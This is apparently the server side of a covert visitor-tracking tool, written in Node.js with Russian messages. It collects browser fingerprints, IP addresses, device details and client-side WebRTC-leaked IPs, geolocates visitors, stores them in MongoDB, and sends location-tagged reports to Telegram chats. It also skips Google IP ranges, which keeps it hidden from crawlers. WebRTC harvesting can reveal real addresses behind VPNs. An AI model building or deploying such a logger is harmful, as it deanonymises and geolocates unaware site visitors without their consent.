const express = require('express');
const fs = require('fs');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const fingerprint = require('./modules/fingerprint');
const visitorInfo = require('./modules/visitorinfo');
const reportInfo = require('./modules/reportinfo');
const mongo = require('./modules/mongo');

const app = express();
app.use(express.json());
app.set('trust proxy', true);
app.use(express.static(path.join(__dirname, 'public')));

// ENV
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_IDS = (process.env.CHAT_IDS || '').split(',').map(id => id.trim());
const DOMAIN = process.env.DOMAIN || 'https://example.com';

// TELEGRAM
const bot = new TelegramBot(TELEGRAM_TOKEN);
bot.setWebHook(`${DOMAIN}/bot${TELEGRAM_TOKEN}`);

// VISITOR DATA
const VISITORS_FILE = './visitors.json';
let visitors = {};

try {
  if (fs.existsSync(VISITORS_FILE)) {
    visitors = JSON.parse(fs.readFileSync(VISITORS_FILE));
  }
} catch (err) {
  console.error('Ошибка чтения visitors.json:', err);
  visitors = {};
}

// ROUTES
app.post(`/bot${TELEGRAM_TOKEN}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

bot.onText(/\/stats/, async (msg) => {
  try {
    const visitors = await mongo.getAllVisitors();
    const today = new Date().toISOString().slice(0, 10);
    let total = 0, bots = 0, pc = 0, mobile = 0;
    for (const v of visitors) {
      if (!v.time || !v.uaParsed) continue;
      if (!v.time.startsWith(today)) continue;
      total++;
      if (v.type === '🤖 Бот') bots++;
      else if (v.uaParsed.device && v.uaParsed.device.toLowerCase().includes('десктоп')) pc++;
      else if (v.uaParsed.device && (v.uaParsed.device.toLowerCase().includes('android') || v.uaParsed.device.toLowerCase().includes('iphone') || v.uaParsed.device.toLowerCase().includes('mobile'))) mobile++;
    }
    let msgText = `Статистика за сегодня\n`;
    msgText += `Всего заходов: ${total}, из них боты: ${bots}\n`;
    msgText += `ПК: ${pc}, телефоны: ${mobile}\n`;
    msgText += `\nСпасибо, что пользуетесь APGRHOST!`;
    bot.sendMessage(msg.chat.id, msgText);
  } catch (err) {
    console.error('Ошибка MongoDB /stats:', err);
    bot.sendMessage(msg.chat.id, 'Ошибка при получении статистики.');
  }
});

app.get('/ping-bot', (req, res) => {
  const now = new Date().toISOString();
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || '';
  console.log(`[PING] ${now} - Пинг от IP: ${ip}`);
  res.send('OK');
});

app.post('/collect', async (req, res) => {
  const { fingerprint: fp, userAgent, timezone, clientTime } = req.body || {};
  const rawIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress || '';
  const ip = visitorInfo.extractIPv4(rawIp);

  if (!fp && !ip) {
    return res.status(400).json({ ok: false, error: 'Нет fingerprint и IP' });
  }

  if (visitorInfo.isGoogleIP(ip)) {
    return res.status(200).json({ ok: true, skip: 'GoogleBot IP' });
  }

  const isBot = detectBot(userAgent);
  const type = isBot ? '🤖 Бот' : '👤 Человек';

  // Парсинг устройства
  const uaData = visitorInfo.parseDevice(userAgent || '');
  if (!uaData.device) uaData.device = 'неизвестно';
  if (!uaData.browser) uaData.browser = '';
  if (!uaData.os) uaData.os = '';

  const geoData = await visitorInfo.getGeo(ip);
  const geoNote = geoData.cached ? '⚠️ Данные IP взяты из кэша' : '';
  const geoStr = geoData.location || 'неизвестно';

  // Определение статуса визита
  const status = visitorInfo.getVisitStatus({}, fp, ip); // пустой объект, Mongo теперь источник
  const visitId = fp || `ip_${ip}`;

  // --- Краткий отчет для основного сообщения ---
  let shortMsg = reportInfo.buildShortReport({
    status,
    fp,
    userAgent,
    timezone,
    type,
    ip,
    geoStr,
    uaData
  });

  // --- Подробный отчет для второй кнопки ---
  let webrtcIps = [];
  try {
    const webrtcLog = fs.readFileSync('webrtc_ips.log', 'utf8').split('\n').reverse();
    for (const line of webrtcLog) {
      if (!line) continue;
      const entry = JSON.parse(line);
      if (entry && entry.ips && Array.isArray(entry.ips)) {
        webrtcIps = entry.ips;
        break;
      }
    }
  } catch {}

  let detailsMsg = reportInfo.buildDetailsReport({
    geoData,
    userAgent,
    fp,
    webrtcIps,
    ip,
    screenSize: req.body.screenSize,
    width: req.body.width,
    height: req.body.height,
    platform: req.body.platform,
    language: req.body.language,
    timezone: req.body.timezone,
    clientTime: req.body.clientTime,
    uaParsed: uaData,
    hardwareConcurrency: req.body.hardwareConcurrency,
    deviceMemory: req.body.deviceMemory,
    touchSupport: req.body.touchSupport
  });

  const inlineKeyboard = reportInfo.buildInlineKeyboard(visitId);

  for (const chatId of CHAT_IDS) {
    try {
      if (geoData.lat && geoData.lon && ip && ip !== 'неизвестно') {
        await reportInfo.sendLocationWithReport(bot, chatId, geoData, shortMsg, inlineKeyboard);
      } else {
        await reportInfo.sendShortReport(bot, chatId, shortMsg, inlineKeyboard);
      }
    } catch (err) {
      console.error('Ошибка Telegram:', err);
    }
  }

  // Сохраняем визит в MongoDB
  await mongo.saveVisitor(visitId, {
    fingerprint: fp,
    ip,
    time: new Date().toISOString(),
    userAgent,
    geo: geoStr,
    uaParsed: uaData,
    detailsMsg,
    visitId
  });

  res.json({ ok: true });
});

// Обработка callback кнопки "Посмотреть подробнее"
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;
  if (data && data.startsWith('details_')) {
    const visitId = data.replace('details_', '');
    try {
      const visit = await mongo.getVisitor(visitId);
      if (visit && visit.detailsMsg) {
        await bot.sendMessage(chatId, visit.detailsMsg, { reply_to_message_id: query.message.message_id });
      } else {
        await bot.sendMessage(chatId, 'Детальная информация не найдена. Проверьте, что визит был зафиксирован и сохранён.', { reply_to_message_id: query.message.message_id });
      }
    } catch (err) {
      console.error('Ошибка MongoDB details:', err);
      await bot.sendMessage(chatId, 'Ошибка при получении деталей визита.', { reply_to_message_id: query.message.message_id });
    }
  }
});

// Приём WebRTC IP-адресов с клиента
app.post('/collect-webrtc', (req, res) => {
  const { webrtcIps } = req.body || {};
  if (!Array.isArray(webrtcIps) || webrtcIps.length === 0) {
    return res.status(400).json({ ok: false, error: 'Нет WebRTC IP' });
  }
  // Сохраняем или логируем для анализа (можно доработать под ваши нужды)
  try {
    fs.appendFileSync('webrtc_ips.log', JSON.stringify({ time: new Date().toISOString(), ips: webrtcIps }) + '\n');
  } catch (err) {
    console.error('Ошибка записи webrtc_ips.log:', err);
  }
  res.json({ ok: true });
});

// HELPER
function detectBot(ua) {
  if (!ua) return true;
  return /bot|crawl|spider|google|yandex|baidu|bing|duckduck/i.test(ua);
}

function formatDate(date, tz) {
  try {
    return new Date(date).toLocaleString('ru-RU', { timeZone: tz || 'UTC' });
  } catch {
    return date;
  }
}

// START
const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`🌐 Сервер запущен на порту ${PORT}`);
});
